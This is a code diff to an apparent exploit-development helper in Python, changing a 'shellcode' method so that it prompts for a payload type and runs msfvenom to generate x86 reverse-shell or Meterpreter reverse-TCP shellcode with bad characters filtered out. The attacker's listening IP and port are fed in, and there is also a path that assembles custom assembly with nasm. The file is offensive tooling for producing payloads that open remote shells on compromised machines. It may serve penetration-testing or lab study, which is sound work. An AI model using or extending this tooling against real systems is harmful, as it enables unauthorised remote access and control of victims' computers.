@@ -150,6 +150,8 @@ class System:
             "dest_address": config.dest_address,
         }
 
+
+
         print(session)
         print("-" * 100)
 
@@ -271,22 +273,18 @@ class System:
     @staticmethod
     def shellcode(config):
 
-        # return 'msfvenom -p  lhost=X.X.X.X lport=XXXX -b "\\0x00\\0x0a\\0x0d" -a x86 --platform windows -v esp -f python'
-
-        #payloadtype = System.input("[?] What kind of payload to you want to use? [M]eterpreter | [R]everse | [C]ustom ASM")
+        payloadtype = System.input("[?] What kind of payload to you want to use? [M]eterpreter | [R]everse | [C]ustom ASM")
 
         if config.localip == "" or str(config.localport) == "":
-            ip_port = System.input("[?] Enter target IP:PORT for reverse shell")
+            ip_port = System.input("[?] Enter your IP:PORT listening for reverse shell")
             iface = ip_port.split(":")
             config.localip = iface[0]
             config.localport = iface[1]
 
             System.save_session(config)
 
-        if True:
-        # if payloadtype == "M" or payloadtype == "R":
-            esp = ""
-            # TODO : meterpreter
+        if payloadtype == "R":
+
             msfvenom_cmd = 'msfvenom -p ' + config.platform + '/shell_reverse_tcp lhost=' + config.localip + ' lport=' + str(
                 config.localport) + ' -b "' + "".join(
                 config.badchars) + '" -a x86 --platform ' + config.platform + ' -o shellcode_' + config.platform + ' exitfunc=thread'
@@ -294,8 +292,16 @@ class System:
             stream = os.popen(msfvenom_cmd)
             payload = stream.read()
 
+        elif payloadtype == "M":
+            msfvenom_cmd = 'msfvenom -p ' + config.platform + '/meterpreter_reverse_tcp lhost=' + config.localip + ' lport=' + str(
+                config.localport) + ' -b "' + "".join(
+                config.badchars) + '" -a x86 --platform ' + config.platform + ' -o shellcode_' + config.platform + ' exitfunc=thread'
+            print(msfvenom_cmd)
+            stream = os.popen(msfvenom_cmd)
+            payload = stream.read()
+
         else:
-            asmfile = System.input("[?] Enter path to ASM file: ")
+            asmfile = System.input("[?] Enter path to ASM file : ")
 
             print("nasm " + asmfile + " -o sessions/" + asmfile + ".o")
             stream = os.popen("nasm " + asmfile + " -o sessions/" + asmfile + ".o")
